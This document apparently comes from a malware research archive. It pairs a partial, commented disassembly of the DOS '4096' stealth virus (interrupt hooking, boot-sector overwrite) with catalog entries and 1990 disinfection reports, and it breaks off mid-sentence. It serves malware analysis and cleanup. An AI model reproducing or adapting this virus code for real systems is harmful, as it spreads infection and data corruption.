0C93 2E 8F 06 DB 12          POP CS:W[012DB]            ; [12DB]=Flags
0C98 2E 83 26 DB 12 FE       AND CS:W[012DB],0FFFE      ; Turns off Trap Flag
0C9E 2E 80 3E DA 12 00       CMP CS:B[012DA],0          ; [12DA]=0?
0CA4 75 11                   JNE 0CB7                   ;
0CA6 2E FF 36 DB 12          CS PUSH W[012DB]
0CAB 2E FF 1E 2D 12          CS CALL D[0122D]
0CB0 73 06                   JAE 0CB8
0CB2 2E FE 06 DA 12          CS INC B[012DA]
0CB7 F9                      STC
0CB8 2E FF 2E 41 12          CS JMP D[01241]

                        ; External INT 24 Entry Point

0CBD 32 C0                   XOR AL,AL
0CBF 2E C6 06 DA 12 01       CS MOV B[012DA],1
0CC5 CF                      IRET

                        ; Subrutine. Get BIOS' INT 13 Pointer.
                        ; Output:
                        ;       [122F] -> INT 13
                        ;       [12DA] =  Flag:     00 If HS's IRQ & FPY's IRQ
                        ;                              Points to BIOS.
                        ;                           02 If one thasn't points

0CC6 2E C6 06 DA 12 00       MOV CS:B[012DA],0          ; [12DA] = 00
0CCC E8 20 01                CALL 0DEF                  ; Set 4096 Stack & PushA
0CCF 0E                      PUSH CS                    ;
0CD0 1F                      POP DS                     ; DS = CS
0CD1 B0 13                   MOV AL,013                 ; AL = 13
0CD3 E8 BF F3                CALL 095                   ; Get ES:BS -> INT 13
0CD6 89 1E 2D 12             MOV W[0122D],BX            ; 
0CDA 8C 06 2F 12             MOV W[0122F],ES            ; D[122D]->INT 13
0CDE 89 1E 39 12             MOV W[01239],BX            ;
0CE2 8C 06 3B 12             MOV W[0123B],ES            ; D[1239]->INT 13
0CE6 B2 00                   MOV DL,0                   ; DL=00
0CE8 B0 0D                   MOV AL,0D                  ; AL=0D
0CEA E8 A8 F3                CALL 095                   ; Get ES:BS -> INT 0D ;?
0CED 8C C0                   MOV AX,ES                  ; AX = INT 0D Segment
                                                        ; INT 0D is the IRQ
                                                        ; Used in XTs for the
                                                        ; HD Generated IRQ
0CEF 3D 00 C0                CMP AX,0C000               ; AX ?? C000
0CF2 73 02                   JAE 0CF6                   ; 0D in BIOS?  0CF6
0CF4 B2 02                   MOV DL,2                   ; DL=02
0CF6 B0 0E                   MOV AL,0E                  ; 
0CF8 E8 9A F3                CALL 095                   ; Make ES:BS -> INT 0E
                                                        ; INT 0E is the IRQ of
                                                        ; the Diskette Controler
0CFB 8C C0                   MOV AX,ES                  ; AX = INT 0E Segment
0CFD 3D 00 C0                CMP AX,0C000               ; Is it In BIOS?
0D00 73 02                   JAE 0D04                   ; If So  0D04
0D02 B2 02                   MOV DL,2                   ; DL = 02
0D04 88 16 50 12             MOV B[01250],DL            ; [1250]=2 or 0
0D08 E8 11 01                CALL 0E1C                  ; Save INT 1 Vector And
                                                        ; Point it to CS:0023
0D0B 8C 16 DD 12             MOV W[012DD],SS            ;
0D0F 89 26 DF 12             MOV W[012DF],SP            ; [12DD]=SS:SP
0D13 0E                      PUSH CS                    ;
0D14 B8 40 0D                MOV AX,0D40                ; AX=0D40
0D17 50                      PUSH AX                    ; Stack = CS:0D40
0D18 B8 70 00                MOV AX,070                 ; AX=0070
0D1B 8E C0                   MOV ES,AX                  ; ES=0070
0D1D B9 FF FF                MOV CX,-1                  ; CX=FFFF
0D20 B0 CB                   MOV AL,0CB                 ; AX=00CB
0D22 33 FF                   XOR DI,DI                  ; DI=0000
0D24 F2 AE                   REPNE SCASB                ; Scan a 00 At 0070:0000
0D26 4F                      DEC DI                     ; ES:DI -> 00
0D27 9C                      PUSHF                      ;
0D28 06                      PUSH ES                    ; ES=0070
0D29 57                      PUSH DI                    ; ES:DI->00
0D2A 9C                      PUSHF                      ;;
0D2B 58                      POP AX                     ;;Set Trap Flag
0D2C 80 CC 01                OR AH,1                    ;;in Stack
0D2F 50                      PUSH AX                    ;;
0D30 E4 21                   IN AL,021                  ;
0D32 A2 E5 12                MOV B[012E5],AL            ; Save IRQ State
0D35 B0 FF                   MOV AL,0FF                 ;
0D37 E6 21                   OUT 021,AL                 ; Turn Off All IRQs
0D39 9D                      POPF                       ; Set Trap Flag
0D3A 33 C0                   XOR AX,AX                  ; AX=0000
0D3C FF 2E 2D 12             JMP D[0122D]               ; Jmp to INT 13 Code
                                                        ; From INT 01, after
                                                        ; finding INT 13 Addr
                                                        ; AL=01
0D40 C5 16 31 12             LDS DX,[01231]             ; DS:DX = INT 01 Ptr
0D44 B0 01                   MOV AL,1                   ; AL=01
0D46 E8 53 02                CALL 0F9C                  ; Set INT 01 To Original
0D49 0E                      PUSH CS                    ;
0D4A 1F                      POP DS                     ; DS=CS
0D4B BA 89 0C                MOV DX,0C89                ; DX=0C89
0D4E B0 13                   MOV AL,013                 ; AL=13
0D50 E8 49 02                CALL 0F9C                  ; Set Int 13 To CS:0C89
0D53 B0 24                   MOV AL,024                 ; AL=24
0D55 E8 3D F3                CALL 095                   ; Get INT 24 Address
0D58 89 1E 3D 12             MOV W[0123D],BX            ; [123D]=INT 24 Offset
0D5C 8C 06 3F 12             MOV W[0123F],ES            ; [123F]=INT 24 Segment
0D60 BA BD 0C                MOV DX,0CBD                ; DX=0CBD
0D63 B0 24                   MOV AL,024                 ; AL=24
0D65 E8 34 02                CALL 0F9C                  ; Set Int 24 To CS:0CBD
0D68 E8 7B 00                CALL 0DE6                  ; Set Stack & popa
0D6B C3                      RET                        ; Return

                        ; Subrutine. Restore INT 13 & INT 24 Pointers.

0D6C E8 80 00                CALL 0DEF                  ; Set 4096 Stack & PushA
0D6F 2E C5 16 39 12          CS LDS DX,[01239]
0D74 B0 13                   MOV AL,013
0D76 E8 23 02                CALL 0F9C                  ; Do INT 13-> Original
0D79 2E C5 16 3D 12          CS LDS DX,[0123D]
0D7E B0 24                   MOV AL,024
0D80 E8 19 02                CALL 0F9C                  ; Do INT 24-> Original
0D83 E8 60 00                CALL 0DE6                  ; Set 4096 Stack & PopA
0D86 C3                      RET

                       ; Subrutine.     Set Ctrl-Break to False
 
0D87 B8 00 33                MOV AX,03300               ; AX=3300 Get Ctrl-Break
0D8A E8 07 01                CALL 0E94                  ; INT 21  Flag Dl=00/01                 ; INT 21
0D8D 2E 88 16 E1 12          CS MOV B[012E1],DL         ; [12E1]=Ctrl-Break Stat
0D92 B8 01 33                MOV AX,03301               ;
0D95 32 D2                   XOR DL,DL                  ; Sets Ctrl-Break to no
0D97 E8 FA 00                CALL 0E94                  ; checking iside INT 21                 ; INT 21
0D9A C3                      RET                        ;

                        ; Subrutine.    Restore Ctrl-Break Status

0D9B 2E 8A 16 E1 12          CS MOV DL,B[012E1]
0DA0 B8 01 33                MOV AX,03301
0DA3 E8 EE 00                CALL 0E94                  ; INT 21
0DA6 C3                      RET

                        ; Subrutine.    Push All And Jumps to [Stack Top]
 
0DA7 2E 8F 06 EA 12          CS POP W[012EA]
0DAC 9C                      PUSHF
0DAD 50                      PUSH AX
0DAE 53                      PUSH BX
0DAF 51                      PUSH CX
0DB0 52                      PUSH DX
0DB1 56                      PUSH SI
0DB2 57                      PUSH DI
0DB3 1E                      PUSH DS
0DB4 06                      PUSH ES
0DB5 2E FF 26 EA 12          CS JMP W[012EA]

                        ; Subrutine.    Sets INT 21 ISR to 4096's Routine
                        ;               By Writing a Far jump to the code.

0DBA 2E C4 3E 35 12          CS LES DI,[01235]          ; ES:DI=INT 21 Address
0DBF BE 4B 12                MOV SI,0124B               ; SI=124B
0DC2 0E                      PUSH CS                    ;
0DC3 1F                      POP DS                     ; DS=CS
0DC4 FC                      CLD                        ;
0DC5 B9 05 00                MOV CX,5                   ; CX=0005
0DC8 AC                      LODSB                      ; AL=CS:[124B++]
                                                        ; ( JMP FAR CS:02CC)
0DC9 26 86 05                ES XCHG B[DI],AL           ; Writes in INT 21
0DCC 88 44 FF                MOV B[SI-1],AL             ; a JMP FAR to 4096's
0DCF 47                      INC DI                     ; INT 21 Routine
0DD0 E2 F6                   LOOP 0DC8                  ;
0DD2 C3                      RET                        ;

                        ; Subrutine. Pop All And Jumps To [Stack Top]

0DD3 2E 8F 06 EA 12          CS POP W[012EA]
0DD8 07                      POP ES
0DD9 1F                      POP DS
0DDA 5F                      POP DI
0DDB 5E                      POP SI
0DDC 5A                      POP DX
0DDD 59                      POP CX
0DDE 5B                      POP BX
0DDF 58                      POP AX
0DE0 9D                      POPF
0DE1 2E FF 26 EA 12          CS JMP W[012EA]

                        ; Subrutine. Set Stack to 4096's Stack & popa

0DE6 2E C7 06 5D 13 D3 0D    CS MOV W[0135D],0DD3       ; [135D]=0DD3
0DED EB 07                   JMP 0DF6                   ;  02F6

                        ; Subrutine. Set Stack to 4096's Stack & pusha

0DEF 2E C7 06 5D 13 A7 0D    CS MOV W[0135D],0DA7       ; [135D]=0DA7
0DF6 2E 8C 16 59 13          CS MOV W[01359],SS         ; [1359]=SS
0DFB 2E 89 26 57 13          CS MOV W[01357],SP         ; [1357]=SP
0E00 0E                      PUSH CS                    ;
0E01 17                      POP SS                     ; SS=CS
0E02 2E 8B 26 5B 13          CS MOV SP,W[0135B]         ; SP=[135B]=1600
0E07 2E FF 16 5D 13          CS CALL W[0135D]           ; [135D]=popa/pusha
0E0C 2E 89 26 5B 13          CS MOV W[0135B],SP         ; [135B]=SP
0E11 2E 8E 16 59 13          CS MOV SS,W[01359]         ; Restores SS
0E16 2E 8B 26 57 13          CS MOV SP,W[01357]         ; Restores SP
0E1B C3                      RET

                        ; Subrutine. Save INT 01 Vector & Set it to CS:0023

0E1C B0 01                   MOV AL,1
0E1E E8 74 F2                CALL 095
0E21 2E 89 1E 31 12          CS MOV W[01231],BX
0E26 2E 8C 06 33 12          CS MOV W[01233],ES
0E2B 0E                      PUSH CS
0E2C 1F                      POP DS
0E2D BA 23 00                MOV DX,023
0E30 E8 69 01                CALL 0F9C                  ; Do INT   ->
0E33 C3                      RET

                        ; External INT 21/48 Entry Point
                        ; Allocate Memory
                        ; Input:
                        ;       BX = Count      Memory Paragraph Requested
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Segment    Allocated Memory Block Segment
                        ;       AX = Error Code If CF = 1
                        ;       BX = Size       Size of Largest Memory Block,
                        ;                       If (CF = 1) & (AX = 08)

0E34 E8 03 00                CALL 0E3A                  ; Allocate Memory in BX
0E37 E9 D5 F4                JMP 030F                   ; Exec old 21h and Ret

                        ; Subrutine. Allocate Memory
                        ; Input:
                        ;       BX = Count      Memory Paragraph Requested
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Segment    Allocated Memory Block Segment
                        ;       AX = Error Code If CF = 1
                        ;       BX = Size       Size of Largest Memory Block,
                        ;                       If (CF = 1) & (AX = 08)

0E3A 2E 80 3E E2 12 00       CMP CS:B[012E2],0
0E40 74 48                   JE RET                     ; 12E2 == 00 ? RET
0E42 83 FB FF                CMP BX,-1                  ;
0E45 75 43                   JNE RET                    ; BX != FFFF ? RET
0E47 BB 60 01                MOV BX,0160                ; BX = 0160
0E4A E8 47 00                CALL 0E94                  ; INT 21 Allocate 1600h
                                                        ; BX = Size
                                                        ; AX = New Free Segment
0E4D 72 3B                   JB RET                     ; Error RET
0E4F 8C CA                   MOV DX,CS                  ; DX = CS
0E51 3B C2                   CMP AX,DX                  ;
0E53 72 09                   JB 0E5E                    ; Free Seg < CS ?  0E5E
0E55 8E C0                   MOV ES,AX                  ; ES = Free Seg
0E57 B4 49                   MOV AH,049                 ; AH = 49
0E59 E8 38 00                CALL 0E94                  ; INT 21. Free Mem
0E5C EB 2C                   JMP RET                    ; Return
0E5E 4A                      DEC DX                     ; DX = CS-1
0E5F 8E DA                   MOV DS,DX                  ; DS = CS-1
0E61 C7 06 01 00 00 00       MOV W[1],0                 ; The 4096's MCB is not
                                                        ; any more an MCB
0E67 42                      INC DX                     ; DX = CS
0E68 8E DA                   MOV DS,DX                  ; DS = CS
0E6A 8E C0                   MOV ES,AX                  ; ES = New Free Segment
0E6C 50                      PUSH AX                    ; AX = New Free Segment
0E6D 2E A3 4E 12             MOV CS:W[0124E],AX         ; 124E = Free Segment
0E71 33 F6                   XOR SI,SI                  ; SI = 0000
0E73 8B FE                   MOV DI,SI                  ; DI = 0000
0E75 B9 00 0B                MOV CX,0B00                ; CX = 0B00
0E78 F3 A5                   REP MOVSW                  ; Mov 4096's code to a
                                                        ; safe position.
0E7A 48                      DEC AX                     ; AX--
0E7B 8E C0                   MOV ES,AX                  ; ES = Free Segment - 1
0E7D 2E A1 49 12             MOV AX,CS:W[01249]         ; AX = PSP of 1;MCB
0E81 26 A3 01 00             MOV ES:W[1],AX             ; PSP Segment of New
                                                        ; Free MCB =PSP of 1;MCB
0E85 B8 8A 0E                MOV AX,0E8A                ; AX = 0E8A
0E88 50                      PUSH AX                    ;
0E89 CB                      RETF                       ; Return to New 4096
0E8A C3                      RET                        ; Return

                        ; External INT 21/37 Entry Point
                        ; Get/Set Switch Char
                        ; Input:
                        ;       AL = 00         Get switch character to DL
                        ;          = 01         Set switch character in DL
                        ;          = 02         Read device prefix flag to DL
                        ;          = 03         Set device prefix flag in DL
                        ;       DL = Switch Character for AL=01
                        ;       DL = 00/01 (On/Off) for AL=03
                        ; Return:
                        ;       AL = FF         If illegal function code
                        ;       DL = Switch Character for AL=00
                        ;       DL = 00 Device must be accessed using /DEV/device
                        ;            ?? Device accessible without prefix AL=02

0E8B 2E C6 06 F0 12 02       MOV CS:B[012F0],2          ; [12F0] = 02 (Hidden)
0E91 E9 7B F4                JMP 030F                   ; Exec old 21h and Ret

                        ; Subrutine. Call INT 21

0E94 9C                      PUSHF
0E95 2E FF 1E 35 12          CS CALL D[01235]
0E9A C3                      RET


0E9B FA                      CLI
0E9C 33 C0                   XOR AX,AX
0E9E 8E D0                   MOV SS,AX
0EA0 BC 00 7C                MOV SP,07C00
0EA3 EB 4F                   JMP 0EF4
0EA5 DB DB                   DB 0DB,0DB
0EA7 DB 20                   DB 0DB,020
0EA8 20 F9                   AND CL,BH
0EAA E0 E3                   LOOPNE 0E8F
0EAC C3                      RET
0EAD 80 81 11 12 24          ADD B[BX+DI+01211],024
0EB2 40                      INC AX
0EB3 81 11 12 24             ADC W[BX+DI],02412
0EB7 40                      INC AX
0EB8 F1                      DB 0F1
0EB9 F1                      DB 0F1
0EBA 12 24                   ADC AH,B[SI]
0EBC 40                      INC AX
0EBD 81 21 12 24             AND W[BX+DI],02412
0EC1 40                      INC AX
0EC2 81 10 E3 C3             ADC W[BX+SI],0C3E3
0EC6 80 00 00                ADD B[BX+SI],0
0EC9 00 00                   ADD B[BX+SI],AL
0ECB 00 00                   ADD B[BX+SI],AL
0ECD 00 00                   ADD B[BX+SI],AL
0ECF 00 00                   ADD B[BX+SI],AL
0ED1 82                      DB 082
0ED2 44                      INC SP
0ED3 F8                      CLC
0ED4 70 C0                   JO 0E96
0ED6 82                      DB 082
0ED7 44                      INC SP
0ED8 80 88 C0 82 44          OR B[BX+SI+082C0],044
0EDD 80 80 C0 82 44          ADD B[BX+SI+082C0],044
0EE2 F0 70 C0                LOCK JO 0EA5
0EE5 82                      DB 082
0EE6 28 80 08 C0             SUB B[BX+SI+0C008],AL
0EEA 82                      DB 082
0EEB 28 80 88 00             SUB B[BX+SI+088],AL
0EEF F2 10 F8                REPNE ADC AL,BH
0EF2 70 C0                   JO 0EB4
0EF4 0E                      PUSH CS
0EF5 1F                      POP DS
0EF6 BA 00 B0                MOV DX,0B000
0EF9 B4 0F                   MOV AH,0F
0EFB CD 10                   INT 010
0EFD 3C 07                   CMP AL,7
0EFF 74 03                   JE 0F04
0F01 BA 00 B8                MOV DX,0B800
0F04 8E C2                   MOV ES,DX
0F06 FC                      CLD
0F07 33 FF                   XOR DI,DI
0F09 B9 D0 07                MOV CX,07D0
0F0C B8 20 07                MOV AX,0720
0F0F F3 AB                   REP STOSW
0F11 BE 0E 7C                MOV SI,07C0E
0F14 BB AE 02                MOV BX,02AE
0F17 BD 05 00                MOV BP,5
0F1A 8B FB                   MOV DI,BX
0F1C AC                      LODSB
0F1D 8A F0                   MOV DH,AL
0F1F B9 08 00                MOV CX,8
0F22 B8 20 07                MOV AX,0720
0F25 D1 E2                   SHL DX,1
0F27 73 02                   JAE 0F2B
0F29 B0 DB                   MOV AL,0DB
0F2B AB                      STOSW
0F2C E2 F4                   LOOP 0F22
0F2E 4D                      DEC BP
0F2F 75 EB                   JNE 0F1C
0F31 81 C3 A0 00             ADD BX,0A0
0F35 81 FE 59 7C             CMP SI,07C59
0F39 72 DC                   JB 0F17
0F3B B4 01                   MOV AH,1
0F3D CD 10                   INT 010
0F3F B0 08                   MOV AL,8
0F41 BA B9 7C                MOV DX,07CB9
0F44 E8 55 00                CALL 0F9C                  ; Do INT   ->
0F47 B8 FE 07                MOV AX,07FE
0F4A E6 21                   OUT 021,AL
0F4C FB                      STI
0F4D 33 DB                   XOR BX,BX
0F4F B9 01 00                MOV CX,1
0F52 EB FE                   JMP 0F52
0F54 49                      DEC CX
0F55 75 0B                   JNE 0F62
0F57 33 FF                   XOR DI,DI
0F59 43                      INC BX
0F5A E8 0A 00                CALL 0F67
0F5D E8 07 00                CALL 0F67
0F60 B1 04                   MOV CL,4
0F62 B0 20                   MOV AL,020
0F64 E6 20                   OUT 020,AL
0F66 CF                      IRET
0F67 B9 28 00                MOV CX,028
0F6A E8 26 00                CALL 0F93
0F6D AB                      STOSW
0F6E AB                      STOSW
0F6F E2 F9                   LOOP 0F6A
0F71 81 C7 9E 00             ADD DI,09E
0F75 B9 17 00                MOV CX,017
0F78 E8 18 00                CALL 0F93
0F7B AB                      STOSW
0F7C 81 C7 9E 00             ADD DI,09E
0F80 E2 F6                   LOOP 0F78
0F82 FD                      STD
0F83 80 36 E7 7C 01          XOR B[07CE7],1
0F88 80 36 D7 7C 28          XOR B[07CD7],028
0F8D 80 36 E2 7C 28          XOR B[07CE2],028
0F92 C3                      RET
0F93 83 E3 03                AND BX,3
0F96 8A 87 0A 7C             MOV AL,B[BX+07C0A]
0F9A 43                      INC BX
0F9B C3                      RET

                        ; Subrutine. Set Interrupt Vector
                        ; Input:
                        ;    AL = Interrupt Number
                        ; Output:
                        ;    DS:DX -> Pointer to ISR (Interrupt Service Routine)

0F9C 06                      PUSH ES
0F9D 53                      PUSH BX
0F9E 33 DB                   XOR BX,BX
0FA0 8E C3                   MOV ES,BX
0FA2 8A D8                   MOV BL,AL
0FA4 D1 E3                   SHL BX,1
0FA6 D1 E3                   SHL BX,1
0FA8 26 89 17                ES MOV W[BX],DX
0FAB 26 8C 5F 02             ES MOV W[BX+2],DS
0FAF 5B                      POP BX
0FB0 07                      POP ES
0FB1 C3                      RET


0FB2 E8 11 FD                CALL 0CC6                  ; Make [122D] -> INT 13
0FB5 B2 80                   MOV DL,080
0FB7 E8 08 00                CALL 0FC2
0FBA 32 D2                   XOR DL,DL
0FBC E8 03 00                CALL 0FC2
0FBF E9 AA FD                JMP 0D6C                  ; Restore INTs 13h & 24h
0FC2 B8 01 02                MOV AX,0201
0FC5 E8 11 00                CALL 0FD9
0FC8 72 25                   JB 0FEF
0FCA BE 9B 0E                MOV SI,0E9B
0FCD BF 00 10                MOV DI,01000
0FD0 B9 17 01                MOV CX,0117
0FD3 F3 26 A4                REP ES MOVSB
0FD6 B8 01 03                MOV AX,0301
0FD9 B9 01 26                MOV CX,02601
0FDC 9A 0E FB 07 70          CALL 07007:0FB0E
0FE1 00 33                   ADD B[BP+DI],DH
0FE3 0E                      PUSH CS
0FE4 2E 03 39                CS ADD DI,W[BX+DI]
0FE7 18 89 26 77             SBB B[BX+DI+07726],CL
0FEB 79 00                   JNS 0FED
0FED 00 E2                   ADD DL,AH
0FEF E6 00                   OUT 0,AL
0FF1 F0 E5 E6                LOCK IN AX,0E6
0FF4 A0 9E 16                MOV AL,B[0169E]
0FF7 78 E7                   JS 0FE0
0FF9 36 DA 00                SS FIADD D[BX+SI]

;;;;;;;;;;;;;;;;;;;


  The 4096 virus has spread rapidly in Israel, where it was first
  reported in October 1989 to the USA and the UK.

  The FISH virus is based on it.

  Vesselin Bontchev reported in May 1990:

  No, we don't have this virus in Bulgaria, at least - not yet.  But
  Morton Swimmer gave me a copy of an infected file.  I studied it a
  bit and now I can say that this is the virus which is the easiest
  one to get rid of. Just run an infected file - to ensure that the
  virus is in memory. Then for each directory of your disks execute
  the commands

          copy *.com nul
          copy *.exe nul

  After this turn the computer off to remove the virus from memory.
  That's all - your files are no longer infected.


======= Computer Virus Catalog 1.2: "4096" Virus (5-June-1990) =======
Entry...............: "4096" virus
Alias(es)...........: "100 years" Virus = IDF Virus = Stealth Virus.
Virus Strain........: ---
Virus detected when.: October 1989.
              where.: Haifa, Israel.
Classification......: Program Virus (extending), RAM-resident.
Length of Virus.....: .COM files: length increased by 4096 bytes.
                      .EXE files: length increased by 4096 bytes.
-------------------- Preconditions -----------------------------------
Operating System(s).: MS-DOS
Version/Release.....: 2.xx upward
Computer model(s)...: IBM-PC, XT, AT and compatibles
-------------------- Attributes --------------------------------------
Easy Identification.: ---
Type of infection...: System: Allocates a memory block at high end of
                              memory. Finds original address (inside
                              DOS) of Int 21h handler. Finds original
                              address (inside BIOS) of Int 13h
                              handler, therefore bypasses all active
                              monitors.  Inserts a JMP FAR to virus
                              code inside original DOS handler.
                      .COM files: program length increased by 4096
                      .EXE files: program length increased by 4096
Infection Trigger...: Programs are infected at load time (using the
                      function Load/Execute of MS-DOS), and whenever
                      a file Access is done to a file with the exten-
                      sion of .COM or .EXE, (Open file AH=3D,
                      Create file AH=3C, File attrib AH=43,
                      File time/date AH=57, etc.)
Interrupts hooked...: INT21h, through a JMP FAR to virus code inside
                              DOS handler;
                      INT01h, during virus installation & execution
                              of DOS's load/execute function (AH=4B);
                      INT13h, INT24h during infection.
Damage..............: The computer usually hangs up.
Damage Trigger......: A Get Dos Version call when the date is after
                      the 22th of September and before 1/1 of next
                      year.
Particularities.....: Infected files have their year set to (year+100)
                      of the un-infected file.
                      If the system is infected, the virus redirects
                      all file accesses so that the virus itself can
                      not be read from the file. Also, find first/next
                      function returns are tampered so that files with
                      (year>100) are reduced by 4096 bytes in size.
-------------------- Agents ------------------------------------------
Countermeasures.....: Cannot be detected while in memory, so no
                      monitor/file change detector can help.
Countermeasures successful:
                      1) A Do-it-yourself way: Infect system by
                         running an infected file, ARC/ZIP/LHARC/ZOO
                         all in- fected .COM and .EXE files, boot from
                         unin- fected floppy, and UNARC/UNZIP/LHARC E
                         etc.  all files.  Pay special attention to
                         disin- fection of COMMAND.COM.
                      2) The JIV AntiVirus Package (by the author of
                         this contribution)
                      3) F. Skulason's F-PROT package.
Standard means......: ---
-------------------- Acknowledgement ---------------------------------
Location............: Weizmann Institute, Israel.
Classification by...: Ori Berger
Documentation by....: Ori Berger
Date................: 26-February-1990


==================== End of "4096" Virus =============================


  Report from Jim Bates - The Virus Information Service - October 1990

  === 4K/FRODO/I.D.F Virus ===

  The recent hiatus over possible infection by the 4k/FRODO/IDF virus
  centred on the virus's trigger date of 22nd September.  The fact
  that a bug in the code invariably caused the affected machine to
  hang when an infected file was executed tended to make most
  observers dismissive of the problem.  As usual, the dire warnings
  published by some sections of the computer press prior to the
  trigger date were inaccurate both in their prediction of the number
  of infected machines and also in the description of the effects of
  infection.  This virus has been known to researchers for nearly a
  year now and a preliminary report was published in the May 1990
  issue of the Virus Bulletin in which mention was made of this
  virus's capacity to infect data files as well as COM and EXE program
  files.  No mention was made of this fact in the warnings that I saw
  and I heard no reports from elsewhere that it had been mentioned.
  Since the infection of data files by 4K can cause both immediate and
  long term problems for affected users, more detailed information
  concerning the specific effects of data-file infection has been
  gathered and is reported here so that future misunderstandings and
  omissions may be avoided.

  4K infects both COM and EXE files by the unusual process of summing
  the ASCII values of the three characters which comprise the filename
  extension.  If the total value of the extension characters of an
  uninfected file is 223 (COM) or 226 (EXE) then infection will take
  place.  It should be noted that the individual characters are first
  OR'ed with 0DF hex and this effectively excludes all characters
  below 64.  The total number of possible file extension which fit
  these criteria has been calculated at 1161 (including inversions and
  rotations) and several of them have been noted as common data file
  extensions.  Among these are OLD, MEM, PIF and QLB which total 223,
  and DWG, LOG and TBL which total 226.  The distinction between the
  two sets is important since the virus necessarily distinguishes
  between the techniques necessary to infect COM or EXE files and the
  amount of corruption to the original file contents will be greater
  for EXE (sum 226) type files.


  The Effects

  4K is a "stealth" virus and contains code which misinforms DOS about
  the contents and length of infected files.  This means that while
  the virus is resident and operative in system memory, infected files
  will appear "clean" to the operating system.  This also means that
  such files will similarly appear "clean" to any program using DOS
  services.  Infected data files, if copied to backup disks or tapes
  will carry the infection with them.  The effect of this is
  remarkably similar to the dBase virus which deliberately sets out to
  corrupt data files.  While the virus is resident, all files will
  appear clean and application programs will function normally.
  However, when the virus is removed (by replacing all affected
  program files), application programs will "see" the corruption
  introduced by viral infection and the effects will be unpredictable.
  In one reported incident concerning DWG (drawing) files, the
  application program aborted with an error when an infected data file
  was encountered on a clean system - although program function was
  fine when the machine was re-infected for test purposes.  In this
  instance (EXE type infection), various bytes within what WOULD have
  been the EXE header were altered by the virus and the 4K of virus
  code was appended to the end of the file.  Since this first section
  of the file contained vital header information, an error was
  encountered as soon as an infected file was accessed and the
  application program aborted.  EXE infection from the 4K virus
  usually changes five fields within the EXE header as follows :-

  WORD at offset 04H  =  Number of Pages
  WORD at offset 0EH  =  Stack Segment value
  WORD at offset 10H  =  Stack Pointer value
  WORD at offset 14H  =  Instruction Pointer value
  WORD at offset 16H  =  Code Segment value


  The Cure

  The original contents of these fields can be recovered from the
  beginning of the appended section of virus code.  On EXE type files
  where the sum of the extension characters is 226, the original 28
  byte header is stored at the beginning of the virus code and may be
  identified by comparison with the unmodified fields of the header.
  The actual storage position will always be 4 bytes on from a
  paragraph boundary (ie:  divisible by 16) and will be near the start
  of the last 4096 bytes of the infected file.  Disinfection in this
  case can easily be accomplished by replacing the original header and
  truncating the file by exactly 4096 bytes.  A similar pattern is
  used for the infection of COM type files where the sum of the
  extension characters is 223 but in this case, only the first six
  bytes of the file are altered and need to be recovered (although the
  original 28 bytes are saved exactly as in EXE infection).  Obviously
  the effects of such data corruption are unpredictable and will
  depend upon the type of information and how the relevant application
  program accesses it.  The DWG files mentioned above contained
  graphic data and this may be peculiarly sensitive to this type of
  corruption.

  The extensions mentioned above were selected for mention simply
  because they are extremely common and may produce strange effects on
  recently dis- infected systems.  Among the COM type extensions - MEM
  is used by dBase programs as variable storage and may produce errors
  which could be extremely difficult to trace.  PIF files are used by
  various version of Microsoft WINDOWS and again, the effects will
  vary and could be intermittent.  The QLB extension is used by
  Microsoft's QuickBASIC environment libraries and infection here will
  usually produce immediate errors when the programming environment is
  invoked with an infected library file.  OLD is an extension used by
  many packages and along with QLB it presents a special problem.

  The fact that infected data files may exist on backup disks may be a
  problem when data integrity is paramount but the virus code is
  unlikely to find its way back into the processing stream and thus
  become "live" again.  However, when considering the OLD and QLB
  extensions (and possibly others), there is a distinct chance of this
  "dormant" code being re-activated.  The QLB files for example are
  actually in EXE format (with the familiar MZ header word) but they
  do contain executable code which remains untouched when the COM type
  infection of 4K is introduced.  Thus under certain circumstances,
  invocation of QuickBASIC's environment may execute the virus code
  and re-install it in memory to begin the replication process all
  over again.  The OLD extension presents even more risk since there
  are several program optimisation utilities which rename an original
  program file with an OLD extension prior to generating a modified
  file.  One of the best known of these is the LZEXE file packing
  program.   LZEXE is an excellent utility in widespread use which
  produces significant reductions in size when applied to ordinary EXE
  files.  The reduction is done by creating a self-extracting archive
  of the original program file which unpacks itself in memory when it
  is run.  The original (unpacked) version of the file is renamed with
  an OLD extension and the danger with 4K infection is that when the
  packed file becomes infected, a user might delete it and rename the
  OLD file back to EXE before either using it or repacking it.  In
  spite of the fact that files with an OLD extension are infected as
  COM files, renaming an infected one as EXE and trying to run it WILL
  re-infect a system.

  With infections of the 4K virus, it is therefore plain that ALL
  files should be checked for infection and replaced with clean copies
  if possible.  Since backups may be corrupted, a good, reliable,
  disinfection program is a must to recover damaged data files.
  During tests to confirm some of the effects described in this
  article, I had occasion to try four 4K disinfection programs and I'm
  sad to report that two of them did not disinfect the target file
  correctly and errors occurred even after the virus code was removed.
  The relevant vendors have been informed and are looking into the
  problem.

  VIS Classification - CEARSdD4096A

    **************************** UPDATE ***************************

  Update report from Jim Bates - The Virus Information Service -
  December 1990

  === Disinfection Report ===

  During recent testing of the effects of data corruption experienced
  after an infection of the 4K virus, it was noted that commercially
  available disenfection routines were not as effective as they
  claimed to be.  These routines were put aside until the 4K problem
  was completely resolved but they have since been examined in greater
  detail and the results that were obtained have led to the following
  discussion of disinfection techniques and the associated pitfalls
  which may be encountered.

  The actual process of disinfection must first be defined as
  returning a file (or disk sector) back to EXACTLY the condition it
  was in prior to being infected by virus code.  This will naturally
  included the restoration of content, length, attributes, date/time
  settings and possibly even the cluster location on the disk (for
  copy protected software).  It may well be that restoration of all of
  the above items is unnecessary in most instances, but there are
  certainly occasions when they ARE all needed for correct functioning
  of the appropriate software.

  While there is an obvious division between Parasitic and Boot Sector
  virus disinfection, there is the less obvious categorisation between
  a generic and specific approach.  The virus-generic versus
  virus-specific argument has caused much heated discussion in virus
  research circles for some time now and it is not the intention to
  resurrect this once again except where it affects disinfection
  capabilities.

  Let us first consider Boot Sector viruses - while these are the most
  awkward for ordinary users to recover from, they are actually the
  easiest as far as disinfective software is concerned.
  Virus-specific disinfection software will contain accurate details
  of the virus concerned and by using this will be able to locate the
  original (uninfected) copy of whichever boot sector has been
  affected.  It is then a simple matter of replacing the infected copy
  with the clean one.  Virus-generic software on the other hand, can
  work in one of two ways - if a clean copy of the various system
  sectors has been taken and stored prior to any infection, it is a
  simple matter to repair any infection.  Alternatively, it is often
  possible to reconstruct the relevant sector by specific system
